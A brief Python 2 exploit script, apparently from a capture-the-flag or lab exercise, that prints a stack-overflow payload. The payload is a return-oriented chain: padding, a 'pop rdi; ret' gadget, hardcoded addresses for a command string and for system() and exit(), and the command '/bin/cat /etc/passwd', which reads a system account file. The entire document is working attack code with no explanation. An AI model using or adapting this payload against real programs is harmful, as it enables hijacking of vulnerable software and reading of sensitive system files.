
# string + overflow + gadget pop rdi; ret; + addr of string + addr of system + gadget pop rdi; ret + input to exit + addr of exit

string = "/bin/cat /etc/passwd"

exploit = string + b"\x00" + b"A"*(263 - len(string))

exploit += b"\x03\x08\x40\x00\x00\x00\x00\x00" + b"\x90\xe7\xff\xff\xff\x7f\x00\x00"

exploit += b"\xa0\x23\xa5\xf7\xff\x7f\x00\x00" + b"\x03\x08\x40\x00\x00\x00\x00\x00" + b"\x00"*8  + b"\x40\x70\xa4\xf7\xff\x7f\x00\x00"

print exploit
